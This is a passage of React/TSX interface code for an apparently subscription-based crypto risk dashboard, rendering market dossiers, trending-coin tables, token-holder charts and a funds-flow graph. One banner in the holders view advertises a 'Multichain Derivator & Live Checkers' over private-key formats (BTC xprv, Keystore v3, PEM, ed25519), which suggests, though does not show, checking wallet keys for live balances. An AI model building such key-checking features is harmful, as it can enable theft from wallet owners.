                        {result.temporal && (
                          <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
                            {result.temporal.regime || "STABLE"}
                          </span>
                        )}
                      </div>

                      {result.temporal ? (
                        <div className="rounded-lg border border-border bg-card p-3 space-y-2 text-xs">
                          <div className="flex items-center justify-between text-[11px]">
                            <span className="text-muted-foreground">
                              {isRu ? `Сканов за ${result.temporal.span_hours}ч:` : `Scans over ${result.temporal.span_hours}h:`}{" "}
                              <b className="text-foreground">{result.temporal.scan_count}</b>
                            </span>
                            <span className="text-muted-foreground">
                              Trend: <b className="text-primary">{result.temporal.score_trend}</b>
                            </span>
                          </div>
                          {Array.isArray(result.temporal.scores) && result.temporal.scores.length > 0 && (
                            <div className="flex items-center gap-1.5 flex-wrap pt-1">
                              {result.temporal.scores.map((scVal: number, sci: number) => (
                                <div key={sci} className="flex items-center gap-1">
                                  <span className="rounded border border-border bg-background px-2 py-0.5 text-[11px] font-bold text-foreground">
                                    {scVal}
                                  </span>
                                  {sci < result.temporal.scores.length - 1 && (
                                    <span className="text-muted-foreground">→</span>
                                  )}
                                </div>
                              ))}
                            </div>
                          )}
                          {result.temporal.etm_confidence >= 30 && result.temporal.etm_hours_low !== null && (
                            <div className="rounded border border-amber-500/40 bg-amber-500/10 px-2.5 py-1.5 text-[11px] font-bold text-amber-300">
                              ⏰ Expected Time to Move (ETM): {result.temporal.etm_hours_low}h–{result.temporal.etm_hours_high}h ·{" "}
                              {result.temporal.etm_direction} ({result.temporal.etm_confidence}% conf)
                            </div>
                          )}
                        </div>
                      ) : (
                        <div className="rounded-lg border border-border bg-card p-3 text-[11px] text-muted-foreground">
                          {isRu
                            ? "Темпоральный трек накапливает серию снимков для оценки скорости изменения риска (ETM)."
                            : "Temporal tracker accumulates sequential snapshots to estimate Expected Time to Move (ETM)."}
                        </div>
                      )}
                    </div>

                    {/* 2. Supply Circulation Gauge */}
                    <div className="rounded-lg border border-border bg-card p-3 space-y-2 text-xs">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] uppercase tracking-wider text-muted-foreground font-bold">
                          🪙 {isRu ? "Эмиссия в обращении (Circulating Supply)" : "Circulating Supply Ratio"}
                        </span>
                        <b className="text-foreground">
                          {result.snapshot?.circ_ratio_pct !== null && result.snapshot?.circ_ratio_pct !== undefined
                            ? `${result.snapshot.circ_ratio_pct}% in circulation`
                            : "—"}
                        </b>
                      </div>
                      <div className="h-2.5 w-full overflow-hidden rounded-full bg-background border border-border/60">
                        <div
                          className="h-full bg-gradient-to-r from-primary to-emerald-500 transition-all duration-700"
                          style={{
                            width: `${Math.min(100, Math.max(0, Number(result.snapshot?.circ_ratio_pct ?? 100)))}%`,
                          }}
                        />
                      </div>
                      {Array.isArray(result.snapshot?.data_sources) && result.snapshot.data_sources.length > 0 && (
                        <div className="flex flex-wrap items-center gap-1.5 pt-1">
                          <span className="text-[10px] text-muted-foreground mr-1">
                            {isRu ? "Каналы:" : "Feeds:"}
                          </span>
                          {result.snapshot.data_sources.map((srcName: string, si: number) => (
                            <span
                              key={si}
                              className="rounded border border-emerald-500/30 bg-emerald-500/10 px-2 py-0.5 text-[10px] font-semibold text-emerald-300"
                            >
                              ✓ {srcName}
                            </span>
                          ))}
                        </div>
                      )}
                    </div>

                    {/* 3. Score Waterfall Breakdown */}
                    {Array.isArray(result.score_breakdown) && result.score_breakdown.length > 0 && (
                      <div className="rounded-lg border border-border bg-card p-3 space-y-2">
                        <div className="flex items-center justify-between text-[10px] uppercase text-muted-foreground font-bold">
                          <span>🧩 {isRu ? "Из чего сложился риск-скор:" : "Risk Score Waterfall:"}</span>
                          <span className="text-primary font-bold">Σ {score}/100</span>
                        </div>
                        <div className="flex flex-wrap gap-1.5">
                          {result.score_breakdown.map((sb: any, sbi: number) => (
                            <div
                              key={sbi}
                              className="flex items-center gap-1.5 rounded-md border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px]"
                            >
                              <span className="font-black text-primary">+{sb.score}</span>
                              <span className="text-foreground font-semibold">{sb.name}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                {/* ══════════════════════════════════════════════════════════════════
                    SECTION 4: DETECTED MARKET & CEX SIGNALS (VISUAL INTELLIGENCE CARDS)
                    ══════════════════════════════════════════════════════════════════ */}
                {result.signals?.length > 0 && (
                  <div className="space-y-2.5 pt-2 border-t border-border">
                    <div className="flex items-center justify-between">
                      <p className="text-[11px] uppercase tracking-wider text-primary font-bold">
                        🚨 {isRu ? `Обнаруженные рыночные и биржевые сигналы (${result.signals_total})` : `Detected Market & CEX Signals (${result.signals_total})`}
                      </p>
                      <span className="text-[10px] text-muted-foreground">
                        {isRu ? "Детерминированные триггеры деривативов и стакана" : "Deterministic orderflow & derivatives triggers"}
                      </span>
                    </div>
                    <div className="grid grid-cols-1 gap-2.5 md:grid-cols-3">
                      {result.signals.map((s: any, i: number) => {
                        const sPts = Number(s.score ?? 0);
                        const isHeavy = sPts >= 12;
                        return (
                          <div
                            key={i}
                            className={`rounded-xl border p-3.5 space-y-1.5 transition-all ${
                              isHeavy
                                ? "border-amber-500/50 bg-amber-500/10"
                                : "border-border bg-background/80"
                            }`}
                          >
                            <div className="flex items-center justify-between gap-2">
                              <span className="font-bold text-xs text-foreground">{s.name}</span>
                              <span
                                className={`rounded-md border px-2 py-0.5 text-[10px] font-black ${
                                  isHeavy
                                    ? "border-amber-500 bg-amber-500/20 text-amber-300"
                                    : "border-primary/40 bg-primary/15 text-primary"
                                }`}
                              >
                                +{s.score} pts · {String(s.category || "CEX").toUpperCase()}
                              </span>
                            </div>
                            <p className="text-[11px] text-muted-foreground leading-relaxed">{s.detail}</p>
                          </div>
                        );
                      })}
                    </div>
                    {result.signals_total > result.signals.length && (
                      <p className="text-[11px] text-primary">
                        +{result.signals_total - result.signals.length}{" "}
                        {isRu
                          ? "дополнительных сигналов доступно на тарифах RAW / BLACKBOX"
                          : "more signals available in RAW / BLACKBOX"}
                      </p>
                    )}
                  </div>
                )}
              </div>
            </div>
          );
        };

        if (!result || tool !== "market") return null;

        if (result.mode === "trending_scan") {
          return (
            <div className="space-y-4 font-mono">
              <div className="rounded-xl border border-border bg-card p-5 space-y-4">
                <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
                  <div className="flex flex-wrap items-center gap-2.5">
                    <span className="rounded-full border border-primary/40 bg-primary/15 px-3.5 py-1 text-xs font-bold text-primary">
                      🔥 TRENDING SCAN RESULTS ({result.count_scanned} COINS)
                    </span>
                    <span className="text-xs text-muted-foreground">
                      Coins: <b className="text-foreground">{(result.trending_symbols || []).join(", ")}</b>
                    </span>
                  </div>
                  <div className="flex flex-wrap items-center gap-3 text-xs">
                    <span className="rounded border border-border bg-background px-2.5 py-1">
                      Avg Score: <b className="text-foreground">{result.avg_score}/100</b>
                    </span>
                    <span className="rounded border border-border bg-background px-2.5 py-1">
                      High Risk: <b className={Number(result.high_risk_pct) > 0 ? "text-destructive" : "text-emerald-400"}>{result.high_risk_pct}%</b>
                    </span>
                  </div>
                </div>

                {Array.isArray(result.alerts) && result.alerts.length > 0 && (
                  <div className="rounded-xl border border-destructive/40 bg-destructive/10 p-4 space-y-1.5 text-xs">
                    <p className="font-bold text-destructive uppercase text-[11px]">
                      ⚠️ {result.alerts.length} HIGH+ MANIPULATION / CROWD ALERTS DETECTED:
                    </p>
                    {result.alerts.map((al: any, ali: number) => (
                      <p key={ali} className="text-foreground">
                        <b className="text-destructive">→ ${al.symbol} ({al.score}/100 · {al.level}):</b> {al.conclusion}
                      </p>
                    ))}
                  </div>
                )}

                <p className="text-[11px] text-muted-foreground">
                  💡 {isRu ? "Нажмите на любую строку или кнопку «📊 Досье», чтобы раскрыть полное досье деривативов прямо под выбранной монетой:" : "Click any row or the Dossier button to expand the full derivatives dossier right below that coin:"}
                </p>

                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs border-collapse">
                    <thead>
                      <tr className="border-b border-border text-[10px] uppercase text-muted-foreground">
                        <th className="py-2.5 px-3">#</th>
                        <th className="py-2.5 px-3">Symbol</th>
                        <th className="py-2.5 px-3">Risk Score</th>
                        <th className="py-2.5 px-3">Price / 24h Δ</th>
                        <th className="py-2.5 px-3">MCap / Vol 24h</th>
                        <th className="py-2.5 px-3">OI Total / Funding</th>
                        <th className="py-2.5 px-3">Manip / Crowd / Org</th>
                        <th className="py-2.5 px-3">Top Signals</th>
                        <th className="py-2.5 px-3 text-right">Dossier</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-border/60">
                      {(result.results || []).map((row: any, rIdx: number) => {
                        const isSelected = selectedTrendingDossier?.symbol === row.symbol;
                        const lvlTone =
                          row.level === "CRITICAL" || row.level === "HIGH"
                            ? "border-destructive/40 bg-destructive/15 text-destructive"
                            : row.level === "MEDIUM"
                            ? "border-amber-500/40 bg-amber-500/15 text-amber-400"
                            : "border-emerald-500/40 bg-emerald-500/15 text-emerald-400";
                        return (
                          <tbody key={row.symbol} className="contents">
                            <tr
                              onClick={() => setSelectedTrendingDossier(isSelected ? null : row.dossier)}
                              className={`cursor-pointer transition-colors hover:bg-background/80 ${
                                isSelected ? "bg-primary/15 border-l-2 border-l-primary" : ""
                              }`}
                            >
                              <td className="py-2.5 px-3 text-muted-foreground">{rIdx + 1}</td>
                              <td className="py-2.5 px-3 font-bold text-foreground">${row.symbol}</td>
                              <td className="py-2.5 px-3">
                                <span className={`rounded border px-2 py-0.5 text-[10px] font-bold ${lvlTone}`}>
                                  {row.score}/100 · {row.level}
                                </span>
                              </td>
                              <td className="py-2.5 px-3">
                                <div className="font-bold text-foreground">
                                  {row.price_usd !== null && row.price_usd !== undefined
                                    ? `$${Number(row.price_usd) < 1 ? Number(row.price_usd).toFixed(5) : fmt(row.price_usd)}`
                                    : "—"}
                                </div>
                                {row.price_change_24h !== null && row.price_change_24h !== undefined && (
                                  <div className={`text-[10px] ${Number(row.price_change_24h) >= 0 ? "text-emerald-400" : "text-destructive"}`}>
                                    {Number(row.price_change_24h) >= 0 ? "+" : ""}
                                    {Number(row.price_change_24h).toFixed(1)}%
                                  </div>
                                )}
                              </td>
                              <td className="py-2.5 px-3 text-[11px]">
                                <div>MCap: {row.market_cap ? `$${fmt(row.market_cap)}` : "—"}</div>
                                <div className="text-muted-foreground">Vol: {row.volume_24h ? `$${fmt(row.volume_24h)}` : "—"}</div>
                              </td>
                              <td className="py-2.5 px-3 text-[11px]">
                                <div>OI: {row.oi_total ? `$${fmt(row.oi_total)}` : "—"}</div>
                                <div className="text-muted-foreground">
                                  Fund: {row.funding_rate !== null && row.funding_rate !== undefined ? Number(row.funding_rate).toFixed(6) : "—"}
                                </div>
                              </td>
                              <td className="py-2.5 px-3 text-[11px]">
                                <span className="text-destructive">M:{row.manipulation_risk}</span> ·{" "}
                                <span className="text-amber-400">C:{row.crowd_overcrowding}</span> ·{" "}
                                <span className="text-emerald-400">O:{row.organic_probability}%</span>
                              </td>
                              <td className="py-2.5 px-3">
                                <div className="flex flex-wrap gap-1 max-w-[220px]">
                                  {(row.top_signals || []).length === 0 ? (
                                    <span className="text-muted-foreground">CLEAN</span>
                                  ) : (
                                    (row.top_signals || []).map((sg: string, sgi: number) => (
                                      <span key={sgi} className="rounded border border-border bg-background px-1.5 py-0.5 text-[9px] text-primary">
                                        {sg}
                                      </span>
                                    ))
                                  )}
                                </div>
                              </td>
                              <td className="py-2.5 px-3 text-right">
                                <button
                                  type="button"
                                  onClick={(ev) => {
                                    ev.stopPropagation();
                                    setSelectedTrendingDossier(isSelected ? null : row.dossier);
                                  }}
                                  className={`rounded-lg border px-2.5 py-1 text-[10px] font-bold transition-all ${
                                    isSelected
                                      ? "border-primary bg-primary text-primary-foreground shadow"
                                      : "border-primary/40 bg-primary/10 text-primary hover:bg-primary hover:text-primary-foreground"
                                  }`}
                                >
                                  {isSelected ? (isRu ? "▲ Свернуть" : "▲ Hide") : isRu ? "▼ 📊 Досье" : "▼ 📊 Dossier"}
                                </button>
                              </td>
                            </tr>
                            {isSelected && row.dossier && (
                              <tr className="bg-background/90">
                                <td colSpan={9} className="p-3 sm:p-4 border-l-2 border-l-primary">
                                  {renderMarketDossier(row.dossier, () => setSelectedTrendingDossier(null))}
                                </td>
                              </tr>
                            )}
                          </tbody>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          );
        }

        return renderMarketDossier(result);
      })()}

      {result && tool === "holders" && (
        <div className="space-y-4 font-mono">
          {/* Top Infographic Card: SVG Donut Ring + Stacked Supply Bar + Concentration Gauges */}
          <div className="grid grid-cols-1 gap-4 lg:grid-cols-12">
            {/* Left: SVG Donut Chart + Legend (5 cols) */}
            <div className="rounded-xl border border-border bg-card p-5 lg:col-span-5 flex flex-col justify-between">
              <div className="flex items-center justify-between mb-3">
                <div>
                  <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    {isRu ? "Инфографика распределения эмиссии" : "Token Supply Distribution"}
                  </p>
                  <p className="text-xs font-bold text-foreground mt-0.5">
                    🏛️ {result.token_name || result.display_name || "On-Chain Token"}{" "}
                    <span className="text-primary">
                      {result.token_symbol ? `($${result.token_symbol})` : ""}
                    </span>{" "}
                    · <span className="text-muted-foreground">{String(result.chain || "").toUpperCase()}</span>
                  </p>
                </div>
                <span
                  className={`rounded-full px-3 py-1 text-xs font-bold border ${
                    result.centralization_risk === "CRITICAL" || result.centralization_risk === "HIGH"
                      ? "bg-destructive/20 text-destructive border-destructive/40"
                      : "bg-primary/15 text-primary border-primary/40"
                  }`}
                >
                  {result.centralization_risk} · {result.centralization_score}/100
                </span>
              </div>

              <div className="flex flex-col sm:flex-row items-center gap-5 my-2">
                {/* SVG Donut Chart */}
                <div className="relative h-36 w-36 shrink-0">
                  <svg viewBox="0 0 42 42" className="h-full w-full -rotate-90">
                    <circle cx="21" cy="21" r="15.915" fill="transparent" stroke="hsl(var(--border))" strokeWidth="4.5" />
                    {(() => {
                      let accum = 0;
                      const segs = (result.distribution_segments || []).filter((s: any) => Number(s.pct) > 0);
                      return segs.map((seg: any, idx: number) => {
                        const pct = Math.max(0, Math.min(100, Number(seg.pct)));
                        const dash = `${pct} ${100 - pct}`;
                        const offset = 100 - accum;
                        accum += pct;
                        return (
                          <circle
                            key={idx}
                            cx="21"
                            cy="21"
                            r="15.915"
                            fill="transparent"
                            stroke={seg.color}
                            strokeWidth="4.5"
                            strokeDasharray={dash}
                            strokeDashoffset={offset}
                          />
                        );
                      });
                    })()}
                  </svg>
                  <div className="absolute inset-0 flex flex-col items-center justify-center text-center">
                    <span className="text-[10px] uppercase text-muted-foreground">Top-10</span>
                    <span className="text-base font-bold text-foreground">{result.top10_pct}%</span>
                    <span className="text-[9px] text-primary">HHI {result.hhi_index ?? "—"}</span>
                  </div>
                </div>

                {/* Segments Legend */}
                <div className="flex-1 w-full space-y-1.5 text-xs">
                  {(result.distribution_segments || []).map((seg: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <span className="h-2.5 w-2.5 rounded-sm shrink-0" style={{ backgroundColor: seg.color }} />
                        <span className="text-[11px] text-muted-foreground truncate">{seg.label}</span>
                      </div>
                      <b className="text-[11px] text-foreground">{seg.pct}%</b>
                    </div>
                  ))}
                </div>
              </div>

              {/* Stacked Horizontal Bar */}
              <div className="mt-3 space-y-1">
                <div className="h-3 w-full overflow-hidden rounded-full bg-background border border-border flex">
                  {(result.distribution_segments || []).map((seg: any, idx: number) =>
                    Number(seg.pct) > 0 ? (
                      <div
                        key={idx}
                        style={{ width: `${seg.pct}%`, backgroundColor: seg.color }}
                        title={`${seg.label}: ${seg.pct}%`}
                      />
                    ) : null
                  )}
                </div>
              </div>
            </div>

            {/* Right: Concentration Matrix & Whale Metrics (7 cols) */}
            <div className="rounded-xl border border-border bg-card p-5 lg:col-span-7 space-y-4">
              <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                {isRu ? "Матрица концентрации китов и смарт-контрактов" : "Whale & Contract Concentration Matrix"}
              </p>
              <div className="grid grid-cols-2 gap-3 sm:grid-cols-3">
                {[
                  { k: isRu ? "Всего холдеров" : "Total Holders", v: fmt(result.total_holders, 0), sub: "Indexed wallets" },
                  { k: "Top-1 Holder", v: `${result.top1_pct ?? 0}%`, sub: isRu ? "Крупнейший адрес" : "Largest single holder" },
                  { k: "Top-5 Holders", v: `${result.top5_pct ?? 0}%`, sub: isRu ? "Топ-5 кошельков" : "Top 5 combined" },
                  { k: "Top-10 (All)", v: `${result.top10_pct}%`, sub: isRu ? "Все топ-10 адресов" : "Including LP/Burn" },
                  { k: "Top-10 (Real EOA)", v: `${result.top10_real_pct}%`, sub: isRu ? "Без пулов и сжигания" : "Excl. pools & burn" },
                  { k: "Whales / CEX", v: `${result.whale_pct}% / ${result.cex_pct}%`, sub: `LP: ${result.pool_pct}% · Burn: ${result.burn_pct}%` },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-background p-3.5">
                    <p className="text-[10px] uppercase text-muted-foreground">{c.k}</p>
                    <p className="mt-1 text-base font-bold text-foreground">{c.v}</p>
                    <p className="mt-0.5 text-[10px] text-muted-foreground">{c.sub}</p>
                  </div>
                ))}
              </div>

              {/* Tier concentration bars */}
              <div className="space-y-2 pt-1">
                {[
                  { label: isRu ? "Доля китов (EOA Whales)" : "EOA Whales Share", val: Number(result.whale_pct || 0), color: "bg-red-500" },
                  { label: isRu ? "Реальная концентрация Топ-10 (без LP/Burn)" : "Real Top-10 Concentration", val: Number(result.top10_real_pct || 0), color: "bg-amber-500" },
                  { label: isRu ? "Ликвидность в пулах (DEX LP) + CEX" : "DEX Liquidity + CEX Custody", val: Number(result.pool_pct || 0) + Number(result.cex_pct || 0), color: "bg-emerald-500" },
                ].map((b, bi) => (
                  <div key={bi} className="space-y-1 text-xs">
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">{b.label}</span>
                      <b className="text-foreground">{b.val.toFixed(2)}%</b>
                    </div>
                    <div className="h-2 w-full overflow-hidden rounded-full bg-background border border-border">
                      <div className={`h-full ${b.color}`} style={{ width: `${Math.min(100, b.val)}%` }} />
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Visual Top Holders Table */}
          {result.db_stats?.by_chain && Object.keys(result.db_stats.by_chain).length > 0 && (
            <div className="rounded-xl border border-cyan-500/30 bg-card px-4 py-3 font-mono text-xs flex flex-wrap items-center justify-between gap-2">
              <div className="flex flex-wrap items-center gap-1.5">
                <span className="text-[10px] font-bold uppercase tracking-wider text-cyan-400 mr-1">
                  🧬 {isRu ? "Мультичейн Дериватор & Чекеры:" : "Multichain Derivator & Live Checkers:"}
                </span>
                {Object.entries(result.db_stats.by_chain)
                  .filter(([ch]) => ch !== "undetermined" && ch !== "other")
                  .map(([ch, cnt]: [string, any]) => (
                    <span
                      key={ch}
                      className="rounded border border-cyan-500/30 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-semibold text-cyan-300"
                    >
                      ⛓ {ch.toUpperCase()}: <b>{fmt(Number(cnt || 0), 0)}</b>
                    </span>
                  ))}
              </div>
              <span className="text-[10px] text-muted-foreground">
                {isRu
                  ? "EVM (6 сетей) · BTC xprv (BIP44/49/84) · NEAR ed25519 · Solana · Keystore v3 · PEM (secp256k1) · 45+ API"
                  : "EVM (6 chains) · BTC xprv (BIP44/49/84) · NEAR ed25519 · Solana · Keystore v3 · PEM (secp256k1) · 45+ API"}
              </span>
            </div>
          )}

          <div className="rounded-xl border border-border bg-card p-5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
              <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                🐋 {isRu ? `Топ холдеров и идентифицированных сущностей (${result.top_holders?.length || 0})` : `Top Holders & Identified Entities (${result.top_holders?.length || 0})`}
              </p>
              {result.locked && (
                <span className="inline-flex items-center gap-1 text-[10px] text-primary">
                  <Lock size={11} /> {isRu ? "полные адреса и метки доступны с тарифа RADAR+" : "full addresses & labels require RADAR+"}
                </span>
              )}
            </div>
            <div className="space-y-1.5">
              {result.top_holders?.map((h: any) => {
                const htype = String(h.holder_type || "unknown").toLowerCase();
                const badgeIcon =
                  htype === "cex"
                    ? "🏦 CEX"
                    : htype === "pool" || htype === "dex"
                    ? "💧 LP POOL"
                    : htype === "burn"
                    ? "🔥 BURN"
                    : htype === "bridge"
                    ? "🌉 BRIDGE"
                    : h.is_contract
                    ? "📜 CONTRACT"
                    : "🐳 WHALE";
                return (
                  <div
                    key={h.rank}
                    className="relative overflow-hidden rounded-lg border border-border bg-background px-3.5 py-2.5"
                  >
                    <div
                      className="pointer-events-none absolute inset-y-0 left-0 bg-primary/10"
                      style={{ width: `${Math.min(100, Number(h.percentage || 0) * 1.8)}%` }}
                    />
                    <div className="relative flex flex-wrap items-center justify-between gap-3 text-xs">
                      <div className="flex items-center gap-2.5 min-w-0 flex-1">
                        <span className="w-7 text-[11px] font-bold text-muted-foreground">#{h.rank}</span>
                        <span className="rounded border border-border bg-card px-2 py-0.5 text-[10px] font-bold text-primary shrink-0">
                          {badgeIcon}
                        </span>
                        <span className="truncate font-semibold text-foreground select-all">{h.address}</span>
                        {h.label && h.label.toLowerCase() !== htype && (
                          <span className="truncate rounded bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
                            {h.label}
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-4">
                        {h.quantity > 0 && (
                          <span className="text-[11px] text-muted-foreground hidden sm:inline">
                            {fmt(h.quantity)} {result.token_symbol || ""}
                          </span>
                        )}
                        <span className="w-16 text-right text-xs font-bold text-primary">{h.percentage}%</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      )}

      {result && tool === "funds" && (
        <div className="space-y-4 font-mono">
          {/* Top Target & Scores Banner */}
          <div className="rounded-xl border border-border bg-card p-5 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
              <div className="flex flex-wrap items-center gap-2.5">
                <span className="rounded-lg border border-primary/40 bg-primary/15 px-2.5 py-1 text-xs font-bold text-primary">
                  {result.detected_mode === "LP POOL" ? "💧 LP POOL FLOW" : "📜 CONTRACT / ADDRESS FLOW"}
                </span>
                <span className="text-sm font-bold text-emerald-300">
                  {result.target_icon || "🏛️"} {result.target_name || result.target_label || result.contract_name || result.address}
                </span>
                <code className="text-xs text-muted-foreground">{result.address}</code>
              </div>
              <div className="flex flex-wrap items-center gap-2 text-xs">
                <span className="rounded border border-border bg-background px-2.5 py-1 text-muted-foreground">
                  Chain: <b className="text-foreground">{result.chain}</b> · Window: <b className="text-foreground">{result.days}d</b>
                </span>
                {result.dominant_token_symbol && (
                  <span className="rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-primary font-bold">
                    Token: {result.dominant_token_symbol}
                  </span>
                )}
              </div>
            </div>

            {result.data_coverage?.partial && (
              <div className="rounded-lg border border-amber-500/50 bg-amber-500/10 p-3 text-xs text-amber-300">
                ⚠️ {isRu ? "Частичное покрытие: BSC Transfer-события из RPC; история BNB и внутренних транзакций недоступна." : "Partial coverage: BSC Transfer events from RPC; BNB and internal transaction history unavailable."}
                {result.data_coverage.from_time_utc && ` · ${isRu ? "Начало выборки" : "Sample from"}: ${result.data_coverage.from_time_utc}`}
                {result.data_coverage.truncated && (isRu ? " · Выборка усечена" : " · Sample truncated")}
                {result.data_coverage.unavailable && (isRu ? " · RPC недоступен" : " · RPC unavailable")}
              </div>
            )}
            {/* 4 Score & Volume Cards */}
            <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
              {[
                { k: isRu ? "Риск потока (Risk Score)" : "Flow Risk Score", v: `${result.risk_score}/100` },
                { k: isRu ? "Манипуляции (Wash/Sybil)" : "Manipulation Score", v: `${result.manipulation_score}/100` },
                { k: isRu ? "Активность ботов (MEV/Bot)" : "Bot Activity Score", v: `${result.bot_activity_score}/100` },
                {
                  k: isRu ? "Транзакции / Профили" : "Txs / Profiled Addrs",
                  v: `${fmt(result.total_transactions, 0)} / ${fmt(result.unique_addresses, 0)}`,
                },
              ].map((c, i) => (
                <div key={i} className="rounded-xl border border-border bg-background p-3.5">
                  <p className="text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                  <p className="mt-1 text-lg font-bold text-foreground">{c.v}</p>
                </div>
              ))}
            </div>

            {/* CLI Pattern Breakdown Tree (6 Categories) */}
            {result.pattern_breakdown && (
              <div>
                <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-bold">
                  🔎 {isRu ? "Декомпозиция паттернов потока (CLI Telemetry)" : "Flow Pattern Decomposition"}
                </p>
                <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-3 lg:grid-cols-6 text-xs">
                  {[
                    { k: "🤖 Bot patterns", v: result.pattern_breakdown.bot_patterns ?? 0 },
                    { k: "🔄 Wash trading", v: result.pattern_breakdown.wash_trading ?? 0 },
                    { k: "💸 Fund extraction", v: result.pattern_breakdown.fund_extraction ?? 0 },
                    { k: "⏱️ Timing anomalies", v: result.pattern_breakdown.timing_anomalies ?? 0 },
                    { k: "🏛️ CEX flows", v: result.pattern_breakdown.cex_flows ?? 0 },
                    { k: "🌐 Blockscout signals", v: result.pattern_breakdown.flow_signals ?? 0 },
                  ].map((pat, pi) => (
                    <div
                      key={pi}
                      className={`rounded-lg border p-2.5 ${
                        Number(pat.v) > 0
                          ? "border-primary/40 bg-primary/10 text-foreground"
                          : "border-border bg-background text-muted-foreground"
                      }`}
                    >
                      <p className="text-[10px]">{pat.k}</p>
                      <p className="mt-1 text-sm font-bold">{pat.v} signals</p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Interactive SVG Funds Flow Topology Graph */}
            {result.topology_graph?.nodes?.length > 1 && (
              <div className="rounded-xl border border-border bg-background p-4 space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    🕸️ {isRu ? "Граф связей и потоков средств (Inflow → Target → Outflow)" : "Interactive Funds Flow Topology Graph"}
                  </p>
                  <span className="text-[10px] text-muted-foreground">
                    Inflow: <b className="text-emerald-400">{fmt(result.total_inflow)} {result.dominant_token_symbol}</b> · Outflow:{" "}
                    <b className="text-destructive">{fmt(result.total_outflow)} {result.dominant_token_symbol}</b> · Clusters:{" "}
                    <b className="text-primary">{result.cluster_count}</b>
                  </span>
                </div>

                <div className="overflow-x-auto">
                  <svg viewBox="0 0 860 320" className="w-full min-w-[680px] h-auto rounded-lg bg-card/60 border border-border/60">
                    {(() => {
                      const nodes = result.topology_graph.nodes || [];
                      const inNodes = nodes.filter((n: any) => n.role === "INFLOW");
                      const outNodes = nodes.filter((n: any) => n.role === "OUTFLOW");
                      const targetNode = nodes.find((n: any) => n.role === "TARGET") || { label: result.target_label || "Target", icon: "🎯" };
                      const cx = 430;
                      const cy = 160;
                      return (
                        <>
                          {/* Inflow Edges & Nodes (Left -> Center) */}
                          {inNodes.map((n: any, idx: number) => {
                            const ny = 40 + idx * (240 / Math.max(1, inNodes.length - 1 || 1));
                            const sy = inNodes.length === 1 ? 160 : ny;
                            return (
                              <g key={n.id}>
                                <path
                                  d={`M 230 ${sy} C 320 ${sy}, 330 ${cy}, ${cx - 75} ${cy}`}
                                  fill="none"
                                  stroke="#10b981"
                                  strokeWidth={Math.max(1.5, Math.min(5, (Number(n.share_pct) || 10) / 15))}
                                  strokeOpacity="0.65"
                                />
                                <rect x="20" y={sy - 18} width="210" height="36" rx="8" fill="hsl(var(--card))" stroke="#10b981" strokeWidth="1" />
                                <text x="30" y={sy - 2} fill="hsl(var(--foreground))" fontSize="10" fontWeight="bold">
                                  {n.icon} {String(n.label || n.address).slice(0, 22)}
                                </text>
                                <text x="30" y={sy + 11} fill="#10b981" fontSize="9">
                                  +{fmt(n.amount)} {n.symbol} ({n.share_pct}%)
                                </text>
                              </g>
                            );
                          })}

                          {/* Outflow Edges & Nodes (Center -> Right) */}
                          {outNodes.map((n: any, idx: number) => {
                            const ny = 40 + idx * (240 / Math.max(1, outNodes.length - 1 || 1));
                            const ey = outNodes.length === 1 ? 160 : ny;
                            return (
                              <g key={n.id}>
                                <path
                                  d={`M ${cx + 75} ${cy} C 530 ${cy}, 540 ${ey}, 630 ${ey}`}
                                  fill="none"
                                  stroke="#ef4444"
                                  strokeWidth={Math.max(1.5, Math.min(5, (Number(n.share_pct) || 10) / 15))}
                                  strokeOpacity="0.65"
                                />
                                <rect x="630" y={ey - 18} width="210" height="36" rx="8" fill="hsl(var(--card))" stroke="#ef4444" strokeWidth="1" />
                                <text x="640" y={ey - 2} fill="hsl(var(--foreground))" fontSize="10" fontWeight="bold">
                                  {n.icon} {String(n.label || n.address).slice(0, 22)}
                                </text>
                                <text x="640" y={ey + 11} fill="#ef4444" fontSize="9">
                                  -{fmt(n.amount)} {n.symbol} ({n.share_pct}%)
                                </text>
                              </g>
                            );
                          })}

                          {/* Center Target Hub */}
                          <rect x={cx - 75} y={cy - 34} width="150" height="68" rx="12" fill="hsl(var(--card))" stroke="hsl(var(--primary))" strokeWidth="2" />
                          <text x={cx} y={cy - 10} textAnchor="middle" fill="hsl(var(--primary))" fontSize="11" fontWeight="bold">
                            {targetNode.icon} {String(targetNode.label).slice(0, 18)}
                          </text>
                          <text x={cx} y={cy + 6} textAnchor="middle" fill="hsl(var(--foreground))" fontSize="9">
                            {result.address.slice(0, 8)}…{result.address.slice(-6)}
                          </text>
                          <text x={cx} y={cy + 22} textAnchor="middle" fill="hsl(var(--muted-foreground))" fontSize="9">
                            Risk: {result.risk_score}/100 · {result.detected_mode}
                          </text>
                        </>
                      );
                    })()}
                  </svg>
                </div>
